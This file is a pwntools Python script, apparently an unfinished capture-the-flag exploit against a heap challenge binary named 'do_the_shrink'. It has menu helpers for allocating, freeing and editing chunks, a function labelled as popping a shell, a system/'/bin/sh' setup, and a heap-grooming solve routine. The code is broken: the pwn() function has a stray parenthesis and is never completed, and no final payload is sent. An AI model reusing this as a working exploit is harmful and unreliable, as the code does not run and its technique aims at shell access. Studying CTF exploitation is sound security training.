from pwn import *
import sys

REMOTE = 0
shrink = ELF("./do_the_shrink")

# Control for outgoing connection v local
if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1346)
    print(p.recvuntil(":"))
    p.sendline("joe215")
else:
    p = process("./do_the_shrink")
    p.attach("gdb")

# Option one, create boot
def makeboot(length, contents):
    print(p.recvuntil("> "))
    p.sendline("1")
    print(p.recvuntil("Ah a new boot!"))
    print(p.recvuntil("What size is your boot?"))
    print(str(length))
    p.sendline(str(length))
    print(p.recvuntil("What material is your boot made of?"))
    print(str(contents))
    p.sendline(str(contents))
    p.recvuntil("\n")
    myRecv = p.recvuntil("\n")
    bootIndex = int(myRecv[-2])
    return bootIndex

# Option two, delete boot
def deleteboot(index):
    print(p.recvuntil("> "))
    p.sendline("2")
    print(p.recvuntil("Which boot do you not want anymore?"))
    print(str(index))
    p.sendline(str(index))

# Option three, v1, actually prints and checks what is stored
def innocentappraise(index):
    print(p.recvuntil("> "))
    p.sendline("3")
    print(p.recvuntil("Which one are we appraising today?"))
    print(str(index))
    p.sendline(str(index))
    p.recvline()
    content = p.recvline()
    print(content)
    return content

# Option three, v2, malicious prints which will pop a shell
def maliciousappraise(index):
    print(p.recvuntil("> "))
    p.sendline("3")
    print(p.recvuntil("Which one are we appraising today?"))
    print(str(index))
    p.sendline(str(index))
    p.interactive()

# Option four, edit contents of a boot
def editboot(index, content):
    print(p.recvuntil("> "))
    p.sendline("4")
    print(p.recvuntil("Which boot shall we replace today?"))
    print(str(index))
    p.sendline(str(index))
    print(p.recvuntil("What's the new material of your boot?"))
    print(content)
    p.sendline(str(content))

# Option five, exit
def exit():
    print(p.recvuntil("> "))
    p.sendline("5")
    print(p.recvuntil("good bye!"))

# Pwn function, putting everything in the correct order on heap for a shell
def pwn():(
    sysPLT = "0x4006e0"
    sysPack = p64(sysPLT)
    sysInt = int(sysPLT, 16)
    binsh = "/bin/sh"

# tester
def test():
    idx = makeboot(7, "string")
    print(idx)
    innocentappraise(idx)
    editboot(idx, "strings")
    innocentappraise(idx)
    deleteboot(idx)
    exit()

def solve():
    newOne = makeboot(0x20, ("A" * 0x20))
    newTwo = makeboot(0x20, ("B" * 0x20))
    newThree = makeboot(0x20, ("C" * 0x20))
    deleteboot(0)
    deleteboot(1)
    deleteboot(2)
    makeboot(0x108, ("A"*0x108))
    makeboot(0x208, ("B"*0x200 + p64(0x208)))
    makeboot(0x108, ("C"*108))

solve()
